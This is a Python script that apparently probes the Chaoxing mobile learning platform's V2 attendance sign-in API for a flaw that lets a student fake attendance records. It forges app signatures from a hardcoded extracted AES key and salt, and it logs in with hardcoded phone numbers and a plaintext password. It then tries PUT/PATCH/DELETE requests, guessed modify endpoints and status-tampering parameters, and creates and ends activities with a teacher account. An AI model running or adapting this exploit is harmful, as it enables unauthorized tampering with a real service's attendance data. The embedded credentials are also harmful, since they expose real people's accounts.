import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:1000]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100] or "签到成功" in detail
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"V2签到API漏洞深度验证 - 签到记录创建/修改确认")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")

    print("\n" + "=" * 80)
    print("[3] V2 signIn API - 获取完整签到记录详情")
    print("=" * 80)

    for act in active_ids:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            rec(f"T3-{aid}", f"签到记录: id={data.get('id')}, status={data.get('status')}, "
                f"lat={data.get('latitude')}, lng={data.get('longitude')}, "
                f"create={data.get('createtime')}, update={data.get('updatetime')}, "
                f"name={data.get('name')}, addr={data.get('address', 'N/A')}",
                json.dumps(data, ensure_ascii=False))
        else:
            rec(f"T3-{aid}", f"签到失败: result={d.get('result')}, error={d.get('errorMsg','')}")

    print("\n" + "=" * 80)
    print("[4] V2 signIn API - 尝试PUT/PATCH方法修改签到状态")
    print("=" * 80)

    test_aid = active_ids[0]["id"] if active_ids else "5000163767353"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    for method in ["PUT", "PATCH", "DELETE"]:
        try:
            r = s_s.request(method, f"{base}/v2/apis/sign/signIn",
                           params={"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "status": "1"},
                           headers=ajax_hdr, timeout=20)
            rec(f"T4-{method}", f"V2 signIn {method}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T4-{method}", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[5] V2 API - 尝试其他V2端点修改签到状态")
    print("=" * 80)

    v2_modify_apis = [
        ("PUT", f"{base}/v2/apis/sign/signIn", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("PATCH", f"{base}/v2/apis/sign/signIn", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/updateSign", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("PUT", f"{base}/v2/apis/sign/updateSign", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/modifySign", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/changeSign", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/active/signResult", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("GET", f"{base}/v2/apis/active/signResult", {"activeId": test_aid, "uid": puid_s}),
        ("POST", f"{base}/v2/apis/sign/signResult", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("GET", f"{base}/v2/apis/sign/signResult", {"activeId": test_aid, "uid": puid_s}),
    ]

    for i, (method, url, params) in enumerate(v2_modify_apis):
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.request(method, url, data=params, headers=ajax_hdr, timeout=15)
            path = url.split("/v2/apis/")[1] if "/v2/apis/" in url else url
            rec(f"T5-{i:02d}", f"V2 {method} {path}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T5-{i:02d}", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[6] 创建新的签到活动（进行中）用于测试")
    print("=" * 80)

    create_params = [
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试签到"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试", "ifTiJiao": "1"},
        {"courseId": COURSE_ID, "clazzId": CLASS_ID, "activeType": "2", "title": "测试"},
    ]

    new_aid = None
    for i, params in enumerate(create_params):
        r = s_t.post(f"{base}/ppt/activeAPI/createActive",
                     data=params, headers=ajax_hdr, timeout=20)
        d = safe_json(r)
        rec(f"T6-create-{i}", f"创建签到: params={params}, result={json.dumps(d, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])
        if isinstance(d, dict) and d.get("result"):
            aid = str(d.get("result", ""))
            if aid and aid != "0" and len(aid) > 5:
                new_aid = aid
                print(f"  新签到活动ID: {new_aid}")
                break

    if new_aid:
        print("\n" + "=" * 80)
        print(f"[7] 使用新创建的活动ID={new_aid}测试V2 API")
        print("=" * 80)

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": new_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        rec("T7-01", f"学生V2 signIn(新活动): {json.dumps(d, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])

        r = s_t.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": new_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        rec("T7-02", f"教师V2 signIn(查学生状态): {json.dumps(d, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])

        r = s_s.get(f"{base}/pptSign/stuSignajax",
                    params={"activeId": new_aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                            "longitude": "-1", "appType": "15", "fid": "0"},
                    timeout=20)
        rec("T7-03", f"学生stuSignajax(新活动): {r.text[:100]}", r.text[:300])

        r = s_t.post(f"{base}/ppt/activeAPI/endSign",
                     data={"activeId": new_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                     headers=ajax_hdr, timeout=20)
        rec("T7-04", f"结束签到: {r.text[:100]}", r.text[:300])
    else:
        print("  无法创建新签到活动")

    print("\n" + "=" * 80)
    print("[8] V2 signIn API - 签到记录中status字段分析")
    print("=" * 80)

    status_map = {0: "未签到", 1: "已签到", 2: "迟到", 3: "事假", 4: "病假", 5: "补签", 6: "旷课"}
    for act in active_ids[:5]:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            sign_status = data.get("status", "?")
            status_name = status_map.get(sign_status, f"未知({sign_status})")
            rec(f"T8-{aid[:8]}", f"签到status={sign_status}({status_name}), type={act['type']}, name={act['name']}")

    print("\n" + "=" * 80)
    print("[9] V2 signIn API - 学生尝试修改签到status")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1",
                            "status": "1", "signStatus": "1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            new_status = d["data"].get("status", "?")
            rec(f"T9-{aid[:8]}", f"V2 signIn+status=1: 返回status={new_status}")
        else:
            rec(f"T9-{aid[:8]}", f"V2 signIn+status=1: result={d.get('result')}, error={d.get('errorMsg','')}")

    print("\n" + "=" * 80)
    print("[10] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "v2_sign_deep_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

if __name__ == "__main__":
    run()
